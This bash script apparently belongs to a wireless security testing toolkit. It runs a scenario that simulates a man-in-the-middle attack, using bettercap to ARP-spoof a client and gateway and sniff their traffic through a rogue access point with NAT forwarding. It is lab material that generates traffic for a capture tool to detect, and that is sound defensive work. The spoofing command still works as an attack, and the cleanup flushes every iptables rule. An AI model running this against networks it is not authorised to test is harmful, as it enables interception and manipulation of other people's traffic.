#!/bin/bash

# ─── Paths ───
BASH_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
CONFIG_DIR="$BASH_DIR/config"
HELPERS_DIR="$BASH_DIR/helpers"
SCENARIO_DIR="$BASH_DIR/scenarios"
SERVICES_DIR="$BASH_DIR/services"
UTILITIES_DIR="$BASH_DIR/utilities"

# ─── Configs ───
source "$CONFIG_DIR/global.conf"
source "$CONFIG_DIR/t014.conf"

# ─── Dependencies ───
source "$HELPERS_DIR/fn_mode.sh"
source "$HELPERS_DIR/fn_print.sh"
source "$HELPERS_DIR/fn_prompt.sh"

# ─── Show Introduction ───
print_none "This scenario simulates a man-in-the-middle (MiTM) attack via ARP spoofing, launched from a rogue wireless entry point.  It targets a client and gateway to hijack traffic, enabling packet interception or manipulation."

confirmation

# ─── Show Pre-reqs ───
print_section "Scenario Pre-requisites"
print_none "1. Open Access Point with associated client"
print_none "2. WSTT full/filtered capture"
print_blank

# ─── Show Parameters ───
print_section "Simulation Parameters"
print_none "Threat     : $T014_NAME ($T014_ID)"
print_none "Interface  : $INTERFACE"
print_none "Tool       : $T014_TOOL"
print_none "Mode       : $T014_MODE"

confirmation

# ─── Show AP Config ───
print_section "Access Point / Client Preparation"
print_action "Launch Access Point and associate a client device"
print_none "Client IP  : $T014_TARGET_IP"
print_none "Gateway IP : $T014_TARGET_GW"
print_none "Forward IF : $T014_FWD_INTERFACE"

confirmation

# ─── Show Capture Config ───
print_section "WSTT Capture Preparation"
print_action "Launch a full or filtered capture using WSTT"
print_none "BSSID      : $T014_BSSID"
print_none "Channel    : $T014_CHANNEL"
print_none "Duration   : $T014_DURATION seconds"

confirmation

# ─── Run Simulation ───
clear
print_section "Simulation Running"

ensure_managed_mode
print_blank
print_action "Starting NAT: Client Internet access ENABLED"
sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null
sudo iptables -t nat -A POSTROUTING -o $T014_FWD_INTERFACE -j MASQUERADE
print_blank
print_waiting "Launching ARP Spoofing from Wireless Entry Point"
sudo timeout "$T014_DURATION" bettercap -iface "$INTERFACE" -eval "set arp.spoof.targets $T014_TARGET_IP; set arp.spoof.gateway $T014_TARGET_GW; arp.spoof on; net.sniff on"
EXIT_CODE=$?
print_action "Stopping NAT"
sudo iptables -F
sudo iptables -t nat -F
print_blank

if (( EXIT_CODE == 0 )); then
    print_success "Simulation completed"
else
    print_fail "Simulation stopped (Code: $EXIT_CODE)"
fi

exit 0